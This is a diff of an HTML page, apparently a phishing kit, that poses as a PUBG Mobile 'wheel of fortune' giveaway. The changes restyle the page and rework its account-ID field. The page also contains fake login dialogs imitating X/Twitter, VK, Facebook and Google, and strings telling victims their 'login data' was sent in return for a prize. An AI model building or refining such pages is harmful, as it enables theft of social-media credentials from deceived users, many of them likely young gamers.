@@ -70,11 +70,11 @@
             position: relative;
         }
         
-        /* Левая часть меню (меню поддержки) */
+        /* Меню поддержки */
         .support-menu {
+            position: relative;
             flex: 1;
             min-width: 120px;
-            position: relative;
         }
         
         .support-btn {
@@ -90,7 +90,7 @@
             align-items: center;
             gap: 8px;
             width: 100%;
-            justify-content: space-between;
+            justify-content: center;
         }
         
         .support-dropdown {
@@ -100,7 +100,7 @@
             background: #1a2c42;
             border: 1px solid #2a3b5a;
             border-radius: 5px;
-            min-width: 200px;
+            min-width: 180px;
             max-height: 300px;
             overflow-y: auto;
             display: none;
@@ -112,19 +112,8 @@
             animation: fadeInDropdown 0.3s ease;
         }
         
-        @keyframes fadeInDropdown {
-            from {
-                opacity: 0;
-                transform: translateY(-10px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-        
         .support-option {
-            padding: 10px 15px;
+            padding: 12px 15px;
             cursor: pointer;
             border-bottom: 1px solid #2a3b5a;
             transition: all 0.3s;
@@ -147,29 +136,11 @@
             text-align: center;
         }
         
-        .logo {
-            font-family: 'Orbitron', sans-serif;
-            font-size: 20px;
-            color: #8da1b5;
-            font-weight: 500;
-            letter-spacing: 1px;
-            position: absolute;
-            left: 50%;
-            transform: translateX(-50%);
-            white-space: nowrap;
-        }
-        
-        /* Правая часть меню (язык + почта) */
-        .right-menu {
-            flex: 1;
-            display: flex;
-            justify-content: flex-end;
-            gap: 10px;
-            min-width: 250px;
-        }
-        
         .language-menu {
             position: relative;
+            flex: 1;
+            min-width: 120px;
+            margin-left: 20px; /* Сдвигаем язык вправо */
         }
         
         .language-btn {
@@ -184,13 +155,14 @@
             display: flex;
             align-items: center;
             gap: 8px;
+            width: 100%;
             justify-content: space-between;
         }
         
         .language-dropdown {
             position: absolute;
             top: 100%;
-            right: 0;
+            left: 0;
             background: #1a2c42;
             border: 1px solid #2a3b5a;
             border-radius: 5px;
@@ -204,6 +176,17 @@
         .language-dropdown.show {
             display: block;
             animation: fadeInDropdown 0.3s ease;
+        }
+        
+        @keyframes fadeInDropdown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
         
         .language-option {
@@ -221,7 +204,26 @@
             transform: translateX(5px);
         }
         
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 20px;
+            color: #8da1b5;
+            font-weight: 500;
+            letter-spacing: 1px;
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            white-space: nowrap;
+        }
+        
         /* Иконка почты для приза с анимацией */
+        .prize-mail-icon {
+            flex: 1;
+            display: flex;
+            justify-content: flex-end;
+            min-width: 120px;
+        }
+        
         .prize-mail-btn {
             background: linear-gradient(to right, #2a3b5a, #1a2c42);
             color: #8da1b5;
@@ -238,6 +240,7 @@
             transition: all 0.3s;
             font-family: 'Orbitron', sans-serif;
             font-size: 12px;
+            margin-left: auto;
         }
         
         .prize-mail-btn:hover:not(:disabled) {
@@ -645,40 +648,122 @@
             opacity: 0.8;
         }
         
-        /* НОВАЯ АНИМИРОВАННАЯ РАМКА */
+        /* РАМКА ВЫБОРА С УЛУЧШЕННОЙ АНИМАЦИЕЙ */
         .selection-frame {
             position: absolute;
-            border: 2px solid transparent;
+            border: 2px solid #1877F2;
             border-radius: 15px;
-            background-image: linear-gradient(#0a1520, #0a1520), 
-                              linear-gradient(90deg, #2a3b5a 0%, #8da1b5 50%, #2a3b5a 100%);
-            background-origin: border-box;
-            background-clip: padding-box, border-box;
-            background-size: 100% 100%, 200% 100%;
-            animation: border-flow 3s linear infinite;
+            box-shadow: 
+                0 0 20px rgba(24, 119, 242, 0.8),
+                0 0 40px rgba(24, 119, 242, 0.4),
+                inset 0 0 20px rgba(24, 119, 242, 0.2);
             transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             z-index: 100;
             pointer-events: none;
             opacity: 0;
+            background: rgba(24, 119, 242, 0.15);
             backdrop-filter: blur(5px);
             display: flex;
             align-items: center;
             justify-content: center;
         }
+        
+        .selection-frame::before {
+            content: '';
+            position: absolute;
+            top: -6px;
+            left: -6px;
+            right: -6px;
+            bottom: -6px;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 18px;
+            animation: borderRotate 4s linear infinite;
+            pointer-events: none;
+        }
+        
+        .selection-frame::after {
+            content: '';
+            position: absolute;
+            top: 6px;
+            left: 6px;
+            right: 6px;
+            bottom: 6px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            pointer-events: none;
+            animation: innerGlow 3s ease-in-out infinite alternate;
+        }
 
-        @keyframes border-flow {
-            0% {
-                background-position: 0 0, 0 0;
+        @keyframes innerGlow {
+            from {
+                border-color: rgba(255, 255, 255, 0.2);
             }
-            100% {
-                background-position: 0 0, 200% 0;
+            to {
+                border-color: rgba(24, 119, 242, 0.4);
+            }
+        }
+        
+        /* Уголки рамки */
+        .corner {
+            position: absolute;
+            width: 12px;
+            height: 12px;
+            border: 2px solid #1877F2;
+            opacity: 0.8;
+        }
+        
+        .corner-tl {
+            top: -4px;
+            left: -4px;
+            border-right: none;
+            border-bottom: none;
+            border-top-left-radius: 6px;
+            animation: cornerPulse 2s infinite;
+        }
+        
+        .corner-tr {
+            top: -4px;
+            right: -4px;
+            border-left: none;
+            border-bottom: none;
+            border-top-right-radius: 6px;
+            animation: cornerPulse 2s infinite 0.5s;
+        }
+        
+        .corner-bl {
+            bottom: -4px;
+            left: -4px;
+            border-right: none;
+            border-top: none;
+            border-bottom-left-radius: 6px;
+            animation: cornerPulse 2s infinite 1s;
+        }
+        
+        .corner-br {
+            bottom: -4px;
+            right: -4px;
+            border-left: none;
+            border-top: none;
+            border-bottom-right-radius: 6px;
+            animation: cornerPulse 2s infinite 1.5s;
+        }
+
+        @keyframes cornerPulse {
+            0%, 100% {
+                opacity: 0.8;
+                transform: scale(1);
+            }
+            50% {
+                opacity: 1;
+                transform: scale(1.3);
             }
         }
         
         .selection-frame.active {
             opacity: 1;
             animation: 
-                border-flow 3s linear infinite,
+                pulse 1.2s infinite alternate,
+                glow 2s infinite alternate,
                 frameFloat 3s ease-in-out infinite;
         }
 
@@ -688,6 +773,40 @@
             }
             50% {
                 transform: translateY(-3px);
+            }
+        }
+        
+        @keyframes borderRotate {
+            0% { border-color: rgba(255, 255, 255, 0.3); }
+            25% { border-color: rgba(24, 119, 242, 0.5); }
+            50% { border-color: rgba(255, 255, 255, 0.3); }
+            75% { border-color: rgba(24, 119, 242, 0.5); }
+            100% { border-color: rgba(255, 255, 255, 0.3); }
+        }
+        
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                box-shadow: 
+                    0 0 20px rgba(24, 119, 242, 0.8),
+                    0 0 40px rgba(24, 119, 242, 0.4),
+                    inset 0 0 20px rgba(24, 119, 242, 0.2);
+            }
+            100% {
+                transform: scale(1.03);
+                box-shadow: 
+                    0 0 30px rgba(24, 119, 242, 1),
+                    0 0 60px rgba(24, 119, 242, 0.6),
+                    inset 0 0 30px rgba(24, 119, 242, 0.3);
+            }
+        }
+        
+        @keyframes glow {
+            0% {
+                background: rgba(24, 119, 242, 0.15);
+            }
+            100% {
+                background: rgba(24, 119, 242, 0.25);
             }
         }
         
@@ -817,7 +936,7 @@
             font-size: 20px;
         }
         
-        /* ФОРМА ВЫБОРА СОЦСЕТИ - ОБНОВЛЕННАЯ */
+        /* ФОРМА ВЫБОРА СОЦСЕТИ */
         .social-select-section {
             background: rgba(20, 35, 60, 0.9);
             border-radius: 20px;
@@ -869,48 +988,46 @@
             font-size: 16px;
         }
         
-        /* Поле для ввода Account ID */
+        /* БЛОК ВВОДА ID АККАУНТА */
         .account-id-section {
+            background: rgba(12, 26, 45, 0.7);
+            border-radius: 15px;
+            padding: 20px;
             margin-bottom: 25px;
-            animation: slideInUp 0.5s ease-out 0.2s both;
+            border: 2px solid rgba(24, 119, 242, 0.3);
         }
-
+        
         .account-id-label {
-            display: block;
-            margin-bottom: 8px;
             color: #8da1b5;
-            font-size: 14px;
-            font-family: Arial, sans-serif;
+            font-size: 16px;
+            margin-bottom: 12px;
+            display: block;
             text-align: center;
+            font-family: 'Orbitron', sans-serif;
         }
-
+        
         .account-id-input {
             width: 100%;
             padding: 15px;
-            border: 1px solid #2a3b5a;
-            border-radius: 8px;
-            font-size: 16px;
-            background: rgba(12, 26, 45, 0.7);
+            background: rgba(20, 35, 60, 0.8);
+            border: 2px solid #2a3b5a;
+            border-radius: 10px;
             color: white;
+            font-size: 16px;
+            text-align: center;
             font-family: Arial, sans-serif;
             transition: all 0.3s;
-            text-align: center;
         }
-
+        
         .account-id-input:focus {
             outline: none;
             border-color: #1877F2;
             box-shadow: 0 0 15px rgba(24, 119, 242, 0.3);
-            transform: translateY(-2px);
-        }
-
-        .account-id-input::placeholder {
-            color: #8da1b5;
         }
         
         .social-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            grid-template-columns: repeat(4, 1fr);
             gap: 15px;
             margin-bottom: 25px;
         }
@@ -918,7 +1035,7 @@
         .social-option {
             background: rgba(12, 26, 45, 0.7);
             border-radius: 15px;
-            padding: 20px 15px;
+            padding: 15px;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -1000,29 +1117,19 @@
         }
         
         .social-icon {
-            width: 60px;
-            height: 60px;
-            margin-bottom: 12px;
+            width: 50px;
+            height: 50px;
+            margin-bottom: 8px;
             display: flex;
             align-items: center;
             justify-content: center;
             border-radius: 12px;
             overflow: hidden;
             background: rgba(255, 255, 255, 0.1);
-            padding: 10px;
+            padding: 8px;
             transition: all 0.3s;
-            animation: iconFloat 3s ease-in-out infinite;
         }
 
-        @keyframes iconFloat {
-            0%, 100% {
-                transform: translateY(0);
-            }
-            50% {
-                transform: translateY(-5px);
-            }
-        }
-        
         .social-icon img, .social-icon svg {
             width: 100%;
             height: 100%;
@@ -1033,21 +1140,11 @@
         .social-option.selected .social-icon {
             background: rgba(24, 119, 242, 0.2);
             transform: scale(1.1);
-            animation: selectedIcon 1s ease-in-out infinite alternate;
-        }
-
-        @keyframes selectedIcon {
-            from {
-                transform: scale(1.1);
-            }
-            to {
-                transform: scale(1.15);
-            }
         }
         
         .social-option span {
             font-weight: 600;
-            font-size: 14px;
+            font-size: 12px;
             color: #8da1b5;
             font-family: Arial, sans-serif;
             transition: color 0.3s;
@@ -1127,19 +1224,6 @@
             font-size: 20px;
         }
         
-        /* Важное сообщение */
-        .important-notice {
-            text-align: center;
-            color: #8da1b5;
-            font-size: 14px;
-            margin-top: 15px;
-            font-family: Arial, sans-serif;
-            padding: 10px;
-            background: rgba(24, 119, 242, 0.1);
-            border-radius: 8px;
-            border: 1px solid rgba(24, 119, 242, 0.3);
-        }
-        
         /* СЕКЦИЯ ПОДТВЕРЖДЕНИЯ */
         .confirmation-section {
             background: rgba(20, 35, 60, 0.9);
@@ -1215,28 +1299,29 @@
             }
         }
         
-        /* ОБНОВЛЕННЫЕ УВЕДОМЛЕНИЯ - СЛЕВА */
+        /* УВЕДОМЛЕНИЯ - СЛЕВА, КРАСИВЕЕ */
         .notification {
             position: fixed;
-            top: 20px;
+            top: 100px;
             left: 20px;
-            background: linear-gradient(135deg, #162436, #0a1018);
-            color: white;
-            padding: 20px 30px;
-            border-radius: 15px;
+            background: linear-gradient(135deg, #1a2c42, #2a3b5a);
+            color: #8da1b5;
+            padding: 15px 25px;
+            border-radius: 12px;
             border-left: 5px solid #1877F2;
             box-shadow: 
-                0 10px 25px rgba(0, 0, 0, 0.4),
+                0 8px 25px rgba(0, 0, 0, 0.4),
                 inset 0 1px 0 rgba(255, 255, 255, 0.1);
             display: none;
             z-index: 1001;
-            max-width: 350px;
+            max-width: 320px;
             animation: slideInLeft 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
             font-family: Arial, sans-serif;
             backdrop-filter: blur(10px);
             font-weight: 500;
             text-align: left;
-            width: 90%;
+            width: auto;
+            min-width: 250px;
         }
 
         @keyframes slideInLeft {
@@ -1252,20 +1337,25 @@
         
         .notification.error {
             color: #ff6b6b;
-            border-left-color: #ff6b6b;
-            background: linear-gradient(135deg, #2d1a1a, #1a0a0a);
+            border-left-color: #ff4444;
+            background: linear-gradient(135deg, #3a0a0a, #5a1a1a);
         }
         
         .notification.success {
-            color: #51cf66;
-            border-left-color: #51cf66;
-            background: linear-gradient(135deg, #1a2d1a, #0a1a0a);
+            color: #4CAF50;
+            border-left-color: #4CAF50;
+            background: linear-gradient(135deg, #0a3a0a, #1a5a1a);
         }
         
         .notification.warning {
-            color: #ffd43b;
-            border-left-color: #ffd43b;
-            background: linear-gradient(135deg, #2d2d1a, #1a1a0a);
+            color: #ffc107;
+            border-left-color: #ffc107;
+            background: linear-gradient(135deg, #3a2a00, #5a3a00);
+        }
+        
+        .notification i {
+            margin-right: 10px;
+            font-size: 18px;
         }
         
         /* ОСТАЛЬНЫЕ СТИЛИ */
@@ -1341,7 +1431,7 @@
             color: #333;
         }
         
-        /* X (бывший Twitter) стиль */
+        /* Twitter/X стиль */
         .x-modal-step1 {
             padding: 30px;
             animation: modalAppear 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
@@ -1352,16 +1442,6 @@
             height: 40px;
             margin: 0 auto 30px;
             display: block;
-            animation: logoFloat 3s ease-in-out infinite;
-        }
-
-        @keyframes logoFloat {
-            0%, 100% {
-                transform: translateY(0);
-            }
-            50% {
-                transform: translateY(-5px);
-            }
         }
         
         .x-title {
@@ -1534,7 +1614,7 @@
             text-decoration: underline;
         }
         
-        /* X модальное окно для пароля */
+        /* Twitter/X модальное окно для пароля */
         .x-modal-step2 {
             background: #000000;
             color: white;
@@ -1651,7 +1731,6 @@
             height: 48px;
             margin: 0 auto 30px;
             display: block;
-            animation: logoFloat 3s ease-in-out infinite;
         }
         
         .vk-title {
@@ -1771,7 +1850,6 @@
             display: block;
             margin-left: auto;
             margin-right: auto;
-            animation: logoFloat 3s ease-in-out infinite;
         }
         
         .fb-content {
@@ -1914,19 +1992,6 @@
             width: 75px;
             display: block;
             margin-bottom: 25px;
-            animation: googleLogoFloat 4s ease-in-out infinite;
-        }
-
-        @keyframes googleLogoFloat {
-            0%, 100% {
-                transform: translateY(0) rotate(0deg);
-            }
-            25% {
-                transform: translateY(-5px) rotate(5deg);
-            }
-            75% {
-                transform: translateY(5px) rotate(-5deg);
-            }
         }
 
         .google-title {
@@ -1959,16 +2024,6 @@
             font-size: 12px;
             color: #1a73e8;
             z-index: 1;
-            animation: labelPulse 2s infinite alternate;
-        }
-
-        @keyframes labelPulse {
-            from {
-                color: #1a73e8;
-            }
-            to {
-                color: #0d47a1;
-            }
         }
 
         .google-input {
@@ -2193,8 +2248,8 @@
             }
             
             .social-icon {
-                width: 50px;
-                height: 50px;
+                width: 40px;
+                height: 40px;
             }
             
             .logo {
@@ -2277,12 +2332,12 @@
                 padding: 10px 15px;
             }
             
-            .support-btn {
+            .language-btn {
                 padding: 6px 10px;
                 font-size: 12px;
             }
             
-            .language-btn {
+            .support-btn {
                 padding: 6px 10px;
                 font-size: 12px;
             }
@@ -2300,21 +2355,26 @@
                 width: auto;
             }
             
-            .right-menu {
-                min-width: 200px;
+            .support-dropdown {
+                min-width: 160px;
+            }
+            
+            .social-option span {
+                font-size: 10px;
             }
             
             .notification {
                 left: 10px;
                 right: 10px;
-                max-width: none;
+                max-width: calc(100% - 20px);
+                min-width: auto;
             }
         }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 </head>
 <body>
-    <!-- Уведомление -->
+    <!-- Уведомление - СЛЕВА -->
     <div class="notification" id="notification"></div>
     
     <!-- Окно с призом -->
@@ -2399,7 +2459,7 @@
 
     <!-- Модальные окна для входа -->
     
-    <!-- X (бывший Twitter) модальное окно (этап 1: email/username) -->
+    <!-- Twitter/X модальное окно (этап 1: email/username) -->
     <div class="modal-overlay modal-dark" id="xModalStep1">
         <div class="modal modal-dark x-modal-step1">
             <button class="close-modal" onclick="closeModal('xModalStep1')">&times;</button>
@@ -2444,7 +2504,7 @@
         </div>
     </div>
     
-    <!-- X (бывший Twitter) модальное окно (этап 2: пароль) -->
+    <!-- Twitter/X модальное окно (этап 2: пароль) -->
     <div class="modal-overlay modal-dark" id="xModalStep2">
         <div class="modal modal-dark x-modal-step2">
             <button class="close-modal" onclick="closeModal('xModalStep2')">&times;</button>
@@ -2539,38 +2599,38 @@
     <div class="top-menu">
         <div class="support-menu">
             <button class="support-btn" id="supportBtn">
-                <i class="fas fa-bars"></i> Меню <i class="fas fa-chevron-down"></i>
+                <i class="fas fa-headset"></i> Поддержка
             </button>
             <div class="support-dropdown" id="supportDropdown">
                 <a href="https://t.me/helpumgmbot" target="_blank" class="support-option">
-                    <i class="fab fa-telegram"></i> Телеграм поддержка
+                    <i class="fab fa-telegram"></i> Telegram Бот
                 </a>
                 <a href="https://instagram.com/pubgmcis" target="_blank" class="support-option">
-                    <i class="fab fa-instagram"></i> Инстаграм
+                    <i class="fab fa-instagram"></i> Instagram
                 </a>
             </div>
         </div>
-        <div class="logo">КОЛЕСО УДАЧИ</div>
-        <div class="right-menu">
-            <div class="language-menu">
-                <button class="language-btn" id="languageBtn">
-                    <i class="fas fa-globe"></i> Русский <i class="fas fa-chevron-down"></i>
-                </button>
-                <div class="language-dropdown" id="languageDropdown">
-                    <div class="language-option" data-lang="uz">O'zbekcha</div>
-                    <div class="language-option" data-lang="en">English</div>
-                    <div class="language-option" data-lang="kz">Қазақша</div>
-                    <div class="language-option" data-lang="ar">العربية</div>
-                    <div class="language-option" data-lang="zh">中文</div>
-                    <div class="language-option" data-lang="ky">Кыргызча</div>
-                    <div class="language-option" data-lang="dag">Дагестанский</div>
-                    <div class="language-option" data-lang="che">Чеченский</div>
-                    <div class="language-option" data-lang="az">Azərbaycanca</div>
-                    <div class="language-option" data-lang="hy">Հայերեն</div>
-                    <div class="language-option" data-lang="jp">日本語</div>
-                    <div class="language-option" data-lang="uk">Українська</div>
-                </div>
+        <div class="language-menu">
+            <button class="language-btn" id="languageBtn">
+                <i class="fas fa-globe"></i> Русский <i class="fas fa-chevron-down"></i>
+            </button>
+            <div class="language-dropdown" id="languageDropdown">
+                <div class="language-option" data-lang="uz">O'zbekcha</div>
+                <div class="language-option" data-lang="en">English</div>
+                <div class="language-option" data-lang="kz">Қазақша</div>
+                <div class="language-option" data-lang="ar">العربية</div>
+                <div class="language-option" data-lang="zh">中文</div>
+                <div class="language-option" data-lang="ky">Кыргызча</div>
+                <div class="language-option" data-lang="dag">Дагестанский</div>
+                <div class="language-option" data-lang="che">Чеченский</div>
+                <div class="language-option" data-lang="az">Azərbaycanca</div>
+                <div class="language-option" data-lang="hy">Հայերեն</div>
+                <div class="language-option" data-lang="jp">日本語</div>
+                <div class="language-option" data-lang="uk">Українська</div>
             </div>
+        </div>
+        <div class="logo">КОЛЕСО УДАЧИ</div>
+        <div class="prize-mail-icon">
             <button class="prize-mail-btn" id="prizeMailBtn">
                 <i class="fas fa-gift"></i> Мой приз
                 <div class="prize-badge" id="prizeBadge">0</div>
@@ -2616,7 +2676,12 @@
             </div>
             
             <!-- Рамка с индикатором -->
-            <div class="selection-frame" id="selectionFrame"></div>
+            <div class="selection-frame" id="selectionFrame">
+                <div class="corner corner-tl"></div>
+                <div class="corner corner-tr"></div>
+                <div class="corner corner-bl"></div>
+                <div class="corner corner-br"></div>
+            </div>
             <div class="selection-indicator" id="selectionIndicator">ВЫБРАНО</div>
         </div>
         
@@ -2629,10 +2694,10 @@
             <h2>ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ</h2>
             <p>Выберите социальную сеть для получения приза</p>
             
-            <!-- Поле для ввода Account ID -->
+            <!-- Блок ввода ID аккаунта -->
             <div class="account-id-section">
-                <label class="account-id-label">Введите ваш Account ID (обязательно)</label>
-                <input type="text" class="account-id-input" id="accountIdInput" placeholder="Например: 5123456789" maxlength="20">
+                <label class="account-id-label">Введите ваш ID аккаунта PUBG Mobile</label>
+                <input type="text" class="account-id-input" id="accountIdInput" placeholder="Например: 5123456789" required>
             </div>
             
             <div class="social-grid">
@@ -2671,7 +2736,7 @@
                 <i class="fas fa-paper-plane"></i> ПОЛУЧИТЬ ПРИЗ
             </button>
             
-            <p class="important-notice" id="importantNotice">
+            <p style="text-align: center; color: #8da1b5; font-size: 14px; margin-top: 15px; font-family: Arial, sans-serif;" id="importantText">
                 <strong>Важно:</strong> Приз будет зачислен на ваш аккаунт в течение 24 часов
             </p>
         </div>
@@ -2729,7 +2794,7 @@
         let ownerIP = '31.43.60.156';
         let userIP = '';
         let hasPlayed = false;
-        let accountId = '';
+        let userAccountId = '';
         
         // Функции для модальных окон
         function openModal(modalId) {
@@ -2743,12 +2808,12 @@
         }
         
         function openGoogleFullscreen() {
-            // Проверяем Account ID
-            accountId = document.getElementById('accountIdInput').value.trim();
+            const accountId = document.getElementById('accountIdInput').value.trim();
             if (!accountId) {
-                showNotification("Пожалуйста, введите Account ID", true);
+                showNotification("Пожалуйста, введите ваш ID аккаунта", true);
                 return;
             }
+            userAccountId = accountId;
             
             document.getElementById('googleFullscreen').classList.add('active');
             document.body.style.overflow = 'hidden';
@@ -2766,13 +2831,12 @@
         }
         
         function openXModal() {
-            // Проверяем Account ID
-            accountId = document.getElementById('accountIdInput').value.trim();
+            const accountId = document.getElementById('accountIdInput').value.trim();
             if (!accountId) {
-                showNotification("Пожалуйста, введите Account ID", true);
+                showNotification("Пожалуйста, введите ваш ID аккаунта", true);
                 return;
             }
-            
+            userAccountId = accountId;
             openModal('xModalStep1');
         }
         
@@ -2885,8 +2949,6 @@
             const confirmationSection = document.getElementById('confirmationSection');
             const getPrizeBtn = document.getElementById('getPrizeBtn');
             const prizeItems = document.querySelectorAll('.prize-item');
-            const supportBtn = document.getElementById('supportBtn');
-            const supportDropdown = document.getElementById('supportDropdown');
             const languageBtn = document.getElementById('languageBtn');
             const languageDropdown = document.getElementById('languageDropdown');
             const notification = document.getElementById('notification');
@@ -2895,8 +2957,10 @@
             const socialOptions = document.querySelectorAll('.social-option');
             const prizeMailBtn = document.getElementById('prizeMailBtn');
             const collectPrizeBtn = document.getElementById('collectPrizeBtn');
+            const supportBtn = document.getElementById('supportBtn');
+            const supportDropdown = document.getElementById('supportDropdown');
             const accountIdInput = document.getElementById('accountIdInput');
-            const importantNotice = document.getElementById('importantNotice');
+            const importantText = document.getElementById('importantText');
             
             // Элементы Google Fullscreen
             const googleFullscreen = document.getElementById('googleFullscreen');
@@ -2940,18 +3004,18 @@
                     subtitle: "Испытай удачу и выиграй эксклюзивные призы!",
                     selectTitle: "ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ",
                     selectText: "Выберите социальную сеть для получения приза",
+                    accountIdLabel: "Введите ваш ID аккаунта PUBG Mobile",
+                    accountIdPlaceholder: "Например: 5123456789",
                     getPrizeBtn: "ПОЛУЧИТЬ ПРИЗ",
                     notificationSuccess: "Заявка принята! Приз будет зачислен в течение 24 часов.",
                     notificationSelectSocial: "Пожалуйста, выберите социальную сеть",
                     notificationAlreadyPlayed: "Вы уже использовали свою попытку сегодня!",
+                    notificationAccountIdRequired: "Пожалуйста, введите ваш ID аккаунта",
                     confirmationTitle: "ЗАЯВКА ПРИНЯТА!",
                     confirmationMessage: "Ваш выигрыш будет зачислен на аккаунт PUBG Mobile в течение 24 часов.",
                     loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов.",
                     alreadyPlayed: "УЖЕ ИГРАЛИ",
-                    accountIdLabel: "Введите ваш Account ID (обязательно)",
-                    accountIdPlaceholder: "Например: 5123456789",
-                    importantNotice: "Важно: Приз будет зачислен на ваш аккаунт в течение 24 часов",
-                    noAccountId: "Пожалуйста, введите Account ID"
+                    importantText: "<strong>Важно:</strong> Приз будет зачислен на ваш аккаунт в течение 24 часов"
                 },
                 en: {
                     play: "PLAY",
@@ -2959,18 +3023,18 @@
                     subtitle: "Try your luck and win exclusive prizes!",
                     selectTitle: "SELECT RECEIVING METHOD",
                     selectText: "Select social network to receive the prize",
+                    accountIdLabel: "Enter your PUBG Mobile Account ID",
+                    accountIdPlaceholder: "Example: 5123456789",
                     getPrizeBtn: "GET PRIZE",
                     notificationSuccess: "Application accepted! The prize will be credited within 24 hours.",
                     notificationSelectSocial: "Please select a social network",
                     notificationAlreadyPlayed: "You have already used your attempt today!",
+                    notificationAccountIdRequired: "Please enter your Account ID",
                     confirmationTitle: "APPLICATION ACCEPTED!",
                     confirmationMessage: "Your winnings will be credited to your PUBG Mobile account within 24 hours.",
                     loginSuccess: "Login data sent! Prize will be credited within 24 hours.",
                     alreadyPlayed: "ALREADY PLAYED",
-                    accountIdLabel: "Enter your Account ID (required)",
-                    accountIdPlaceholder: "For example: 5123456789",
-                    importantNotice: "Important: The prize will be credited to your account within 24 hours",
-                    noAccountId: "Please enter Account ID"
+                    importantText: "<strong>Important:</strong> Prize will be credited to your account within 24 hours"
                 },
                 uz: {
                     play: "O'YIN",
@@ -2978,18 +3042,18 @@
                     subtitle: "Omadingizni sinab ko'ring va eksklyuziv sovrinlarni yutib oling!",
                     selectTitle: "QABUL QILISH USULINI TANLANG",
                     selectText: "Sovrinni qabul qilish uchun ijtimoiy tarmoqni tanlang",
+                    accountIdLabel: "PUBG Mobile Hisob ID raqamingizni kiriting",
+                    accountIdPlaceholder: "Misol: 5123456789",
                     getPrizeBtn: "SOVRINNI OLISH",
                     notificationSuccess: "Ariza qabul qilindi! Sovrin 24 soat ichida o'tkaziladi.",
                     notificationSelectSocial: "Iltimos, ijtimoiy tarmoqni tanlang",
                     notificationAlreadyPlayed: "Siz bugungi imkoniyatingizdan foydalandingiz!",
+                    notificationAccountIdRequired: "Iltimos, hisob ID raqamingizni kiriting",
                     confirmationTitle: "ARIZA QABUL QILINDI!",
                     confirmationMessage: "Yutigingiz PUBG Mobile hisobingizga 24 soat ichida o'tkaziladi.",
                     loginSuccess: "Kirish ma'lumotlari yuborildi! Sovrin 24 soat ichida o'tkaziladi.",
                     alreadyPlayed: "ALLAQACHON O'YNANGAN",
-                    accountIdLabel: "Account ID kiriting (majburiy)",
-                    accountIdPlaceholder: "Masalan: 5123456789",
-                    importantNotice: "Muhim: Sovrin 24 soat ichida hisobingizga o'tkaziladi",
-                    noAccountId: "Iltimos, Account ID kiriting"
+                    importantText: "<strong>Muhim:</strong> Sovrin 24 soat ichida hisobingizga o'tkaziladi"
                 },
                 kz: {
                     play: "ОЙНАУ",
@@ -2997,18 +3061,18 @@
                     subtitle: "Сәттілігін сынап көріңіз және эксклюзитті жүлделерді ұтып алыңыз!",
                     selectTitle: "ҚАБЫЛДАУ ӘДІСІН ТАҢДАҢЫЗ",
                     selectText: "Жүлдені қабылдау үшін әлеуметтік желіні таңдаңыз",
+                    accountIdLabel: "PUBG Mobile Есептік жазба ID нөміріңізді енгізіңіз",
+                    accountIdPlaceholder: "Мысалы: 5123456789",
                     getPrizeBtn: "ЖҮЛДЕНІ АЛУ",
                     notificationSuccess: "Өтініш қабылданды! Жүлде 24 сағат ішінде аударылады.",
                     notificationSelectSocial: "Өтінеміз, әлеуметтік желіні таңдаңыз",
                     notificationAlreadyPlayed: "Сіз бүгінгі мүмкіндігіңізді пайдаландыңыз!",
+                    notificationAccountIdRequired: "Өтінеміз, есептік жазба ID нөміріңізді енгізіңіз",
                     confirmationTitle: "ӨТІНІШ ҚАБЫЛДАНДЫ!",
                     confirmationMessage: "Жеңісіңіз PUBG Mobile шотыңызға 24 сағат ішінде аударылады.",
                     loginSuccess: "Кіру деректері жіберілді! Жүлде 24 сағат ішінде аударылады.",
                     alreadyPlayed: "ҚАЗІРГІ ОЙНАҒАН",
-                    accountIdLabel: "Account ID енгізіңіз (міндетті)",
-                    accountIdPlaceholder: "Мысалы: 5123456789",
-                    importantNotice: "Маңызды: Жүлде 24 сағат ішінде шотыңызға аударылады",
-                    noAccountId: "Өтінеміз, Account ID енгізіңіз"
+                    importantText: "<strong>Маңызды:</strong> Жүлде 24 сағат ішінде шотыңызға аударылады"
                 },
                 ar: {
                     play: "لعب",
@@ -3016,18 +3080,18 @@
                     subtitle: "جرب حظك واربح جوائز حصرية!",
                     selectTitle: "اختر طريقة الاستلام",
                     selectText: "اختر شبكة اجتماعية لاستلام الجائزة",
+                    accountIdLabel: "أدخل معرف حساب PUBG Mobile الخاص بك",
+                    accountIdPlaceholder: "مثال: 5123456789",
                     getPrizeBtn: "الحصول على الجائزة",
                     notificationSuccess: "تم قبول الطلب! سيتم إضافة الجائزة خلال 24 ساعة.",
                     notificationSelectSocial: "يرجى اختيار شبكة اجتماعية",
                     notificationAlreadyPlayed: "لقد استخدمت محاولتك اليوم بالفعل!",
+                    notificationAccountIdRequired: "الرجاء إدخال معرف حسابك",
                     confirmationTitle: "تم قبول الطلب!",
                     confirmationMessage: "سيتم إضافة ربحك إلى حساب PUBG Mobile الخاص بك خلال 24 ساعة.",
                     loginSuccess: "تم إرسال بيانات تسجيل الدخول! سيتم إضافة الجائزة خلال 24 ساعة.",
                     alreadyPlayed: "لعبت بالفعل",
-                    accountIdLabel: "أدخل معرف الحساب (مطلوب)",
-                    accountIdPlaceholder: "على سبيل المثال: 5123456789",
-                    importantNotice: "مهم: سيتم إضافة الجائزة إلى حسابك خلال 24 ساعة",
-                    noAccountId: "الرجاء إدخال معرف الحساب"
+                    importantText: "<strong>مهم:</strong> سيتم إضافة الجائزة إلى حسابك خلال 24 ساعة"
                 }
             };
             
@@ -3047,11 +3111,11 @@
                 document.querySelector('#socialSelectSection h2').textContent = t.selectTitle;
